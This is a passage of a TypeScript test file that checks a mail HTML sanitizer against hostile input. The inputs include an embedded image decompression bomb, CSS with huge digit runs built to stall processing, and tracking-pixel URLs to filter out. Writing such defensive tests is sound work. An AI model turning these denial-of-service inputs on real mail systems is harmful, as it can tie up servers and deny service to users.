  const html = `<img src="data:image/png;base64,${bomb.toString("base64")}" alt="bomb"><img src="data:image/png;base64,${pngImage(4, 3, () => [1, 2, 3]).toString("base64")}" alt="ok">`;
  const mail = sanitizeMailHtml(html, options("block"));
  assert.match(mail.body, /^<img alt="bomb" \/><img src="data:image\/png;base64,[^"]+" alt="ok" \/>$/);
});

test("hostile CSS cannot hold the server: digit runs in a thousand style attributes and a <style> stay fast; a job over its budget is refused", () => {
  const digits = (index: number) => `${String(index).padStart(4, "0")}${"1".repeat(1995)}`;
  const cases = [
    // The review's 47-second mail: ten attributes of 2,000 digits.
    Array.from({ length: 10 }, (_, index) => `<p style="width:${digits(index)}">x</p>`).join(""),
    // About a megabyte of them (each distinct, so the per-message style cache does not help).
    Array.from({ length: 480 }, (_, index) => `<p style="width:${digits(index)}">x</p>`).join("") + `<style>${Array.from({ length: 95 }, (_, index) => `.a${index}{width:${digits(index)}}`).join("")}</style>`,
    `<div style="${Array.from({ length: 200 }, () => `margin:${"1".repeat(18)}`).join(";")}">x</div>`,
  ];
  for (const html of cases) {
    const started = performance.now();
    const result = sanitizeMailHtml(html, options("proxy"));
    const ms = performance.now() - started;
    assert.ok(ms < 1500, `${html.length} chars took ${Math.round(ms)} ms`);
    assert.ok(result.stable);
    assert.doesNotMatch(result.body + result.css, /1{13}/, "the absurd numbers are dropped");
  }
  const slow = sanitizeMailHtml(ITHOME_HTML, { ...options("proxy"), budgetMs: 0 });
  assert.deepEqual([slow.stable, slow.slow, slow.body, slow.css], [false, true, "", ""], "past the wall-clock budget nothing is shown");
  assert.equal(sanitizeMailHtml(ITHOME_HTML, options("proxy")).slow, undefined);
});

test("the remote images a body shows are listed for the server's fetch, in order, without tracking pixels", () => {
  const shown = sanitizeMailHtml(ITHOME_HTML, options("proxy"));
  assert.equal(shown.remoteUrls.length, shown.remote);
  assert.ok(shown.remoteUrls.every((url) => url.startsWith("https://img.ithome.com.tw/")), shown.remoteUrls.join(" "));
  assert.ok(!shown.remoteUrls.some((url) => /list-manage|eJxVjU1/.test(url)));
});
